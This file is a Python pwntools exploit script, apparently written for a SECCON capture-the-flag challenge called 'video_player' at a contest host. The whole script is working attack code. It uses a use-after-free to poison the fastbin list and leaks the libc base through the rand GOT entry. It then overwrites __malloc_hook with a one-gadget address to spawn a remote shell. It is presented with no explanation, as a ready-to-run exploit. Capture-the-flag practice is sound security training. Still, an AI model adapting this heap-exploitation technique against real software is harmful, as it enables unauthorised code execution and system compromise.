#!/usr/bin/python
from pwn import *
import sys

HOST = "video_player.pwn.seccon.jp"
PORT = 7777


def add_video_clip(res, fps, num, data, desc):
    r.sendline("1")
    r.sendlineafter(">>> ", "1")
    r.sendafter(": ", p64(res))
    r.sendafter(": ", p32(fps))
    r.sendafter(": ", p32(num))
    r.sendafter(": ", data)
    r.sendlineafter(": ", desc)
    r.recvuntil(">>> ")


def edit_video_clip(idx, res, fps, num, data, desc):
    r.sendline("2")
    r.sendlineafter("Enter index : ", str(idx))
    r.sendafter(": ", p64(res))
    r.sendafter(": ", p32(fps))
    r.sendafter(": ", p32(num))
    r.sendafter(": ", data)
    r.sendlineafter(": ", desc)
    r.recvuntil(">>> ")


def play_video_clip(idx):
    r.sendline("3")
    r.sendlineafter("Enter index : ", str(idx))
    r.recvline()
    LEAK = r.recvline()[:-1]
    r.recvuntil(">>> ")
    return LEAK


def exploit(r):
    r.recvline()
    r.sendline("A" * 100)
    r.recvuntil(">>> ")

    log.info("Create initial video (data => fastbin size)")
    add_video_clip(100, 20, 100, "C" * 100, "B" * 16)

    log.info("Edit video for UAF (overwrite fastbin FD")
    edit_video_clip(0, 100, 20, 100, p64(0x6043e5), "B" * 16)

    log.info("Add video to get fake fastbin FD to fastbin list")
    add_video_clip(100, 20, 104, "C" * 104, "B" * 16)

    log.info("Add video to overwrite fastbin content (bss)")

    payload = "\x00" * 11

    # Clip table
    payload += p64(0x604420) + p64(0x0)                  # Pointer to fake video chunk
    payload += p64(0x0) + p64(0x0)

    # Fake video chunk
    payload += p64(0x402968) + p64(0x0000000000000064)   # VTable + Resolution
    payload += p32(0x00000014)                           # FPS
    payload += p32(0x00000006)                           # Length
    payload += p64(e.got["rand"])                        # Data Ptr

    add_video_clip(100, 20, 104, payload, "B" * 16)

    log.info("Leak value of rand got entry")
    RAND = play_video_clip(0)
    RAND = u64(''.join(map(lambda x: chr(ord(x) ^ 0xcc), RAND)).ljust(8, "\x00"))

    libc = ELF("./libc.so.6")
    libc.address = RAND - libc.symbols["rand"]

    log.info("RAND          : %s" % hex(RAND))
    log.info("LIBC          : %s" % hex(libc.address))

    MAIN_ARENA = libc.address + 0x3c4b20
    MALLOC_TARGET = MAIN_ARENA - 0x28 - 11
    ONE_GADGET = libc.address + 0x4526a

    log.info("MAIN ARENA    : %s" % hex(MAIN_ARENA))
    log.info("MALLOC_TARGET : %s" % hex(MALLOC_TARGET))

    log.info("Create malloc overwrite video (data fastbin)")
    add_video_clip(100, 20, 100, "C" * 100, "B" * 16)

    log.info("Edit video for UAF (overwrite fastbin FD")
    edit_video_clip(0, 100, 20, 100, p64(MALLOC_TARGET), "B" * 16)

    log.info("Add video to get fake fastbin FD to fastbin list")
    add_video_clip(100, 20, 104, "C" * 104, "B" * 16)

    log.info("Add video to overwrite malloc hook")
    payload = "A" * 19
    payload += p64(ONE_GADGET)

    add_video_clip(100, 20, 104, payload, "B" * 16)

    log.info("Add a clip to trigger shell")
    r.sendline("1\n1")
    r.recvuntil(">>> ")

    r.interactive()

    return

if __name__ == "__main__":
    e = ELF("./video_player")

    if len(sys.argv) > 1:
        r = remote(HOST, PORT)
        exploit(r)
    else:
        r = process("./video_player", env={"LD_PRELOAD": "./libc.so.6"})
        print util.proc.pidof(r)
        pause()
        exploit(r)
